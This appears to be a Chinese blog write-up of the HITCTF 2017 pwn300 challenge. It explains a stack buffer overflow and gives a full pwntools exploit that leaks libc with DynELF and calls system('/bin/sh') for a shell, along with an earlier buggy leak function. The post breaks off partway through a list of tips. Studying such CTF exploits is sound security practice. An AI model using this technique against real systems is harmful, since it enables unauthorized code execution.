---
title: HITCTF PWN300--dynelf 
date: 2017-04-08 18:26:11
tags:
- CTF
- PWN
- PWNTOOLS
---
第一次用Dynelf，脚本调了一下午。。hitctf pwn300题目链接：http://pan.baidu.com/s/1eSCCOE2漏洞分析：三个write之前的一个函数调用了read来读入字符，而这里存在明显的缓冲区溢出，可以覆盖main函数的栈地址，这个题没给libc，got表里没有system之类的函数，于是考虑用dynelf。攻击脚本：from pwn import *
io = pr
<!-- more -->
## 第一次用Dynelf，脚本调了一下午。。
### hitctf pwn300
漏洞分析：三个write之前的一个函数调用了read来读入字符，而这里存在明显的缓冲区溢出，可以覆盖main函数的栈地址，这个题没给libc，got表里没有system之类的函数，于是考虑用dynelf。

攻击脚本：
~~~
from pwn import *
io = process("./pwn300")

writeplt = 0x80483E0
start_addr = 0x08048400
data_w = 0x0804A030
readplt = 0x8048390

def leak(addr):
    payload = "a" * 0x1A + p32(writeplt) + p32(start_addr) +p32(1) + p32(addr) + p32(4)
    io.sendline(payload)
    io.recvuntil(p32(4))
    io.recv(1)
    data = io.recv(4)
    print "%#x => %s"%(addr,repr(data))
    return data

dynelf = DynELF(leak,elf = ELF("./pwn300"))
sys_addr = dynelf.lookup("system","libc")
read_addr = dynelf.lookup("read","libc")
print "sys_addr:" + hex(sys_addr)
print "read_addr:"+hex(read_addr)
payload1  = "a" * 0x1A + p32(start_addr)
io.sendline(payload1)
payload2 = "a" * 0x1A + p32(read_addr) + p32(start_addr) + p32(0) + p32(data_w) + p32(8)
io.sendline(payload2)
io.send("/bin/sh\x00")
payload3 = "a" * 0x1A + p32(sys_addr) + p32(start_addr) +p32(data_w)
io.sendline(payload3)
io.interactive()
~~~

脚本看起来很简单，但是博主调了一下午。。。主要原因是我原来的leak是这样的：
~~~
def leak(addr):
    payload = "a" * 0x1A + p32(writeplt) + p32(start_addr) +p32(1) + p32(addr) + p32(4)
    io.sendline(payload)
    io.recvline()
    io.recvuntil("\n")
    data = io.recv(4)
    print "%#x => %s"%(addr,repr(data))
~~~

乍一看好像没什么毛病，一跑起来就有问题了：

首先，没return data

然后这个recvuntil(“\n”)是有问题的，因为这个程序是会截断”\r”(ascii码为0x0D)的，dynelf在检测got表时可能会输入含有0d这样的字节，这样我们的payload就会被截断，导致后面的leak雪崩式错误。（由于不清楚dynelf是怎么找got表的，这个leak有时可以有时不行，所以这个bug不好复现）

总之，写leak函数的注意以下几点：
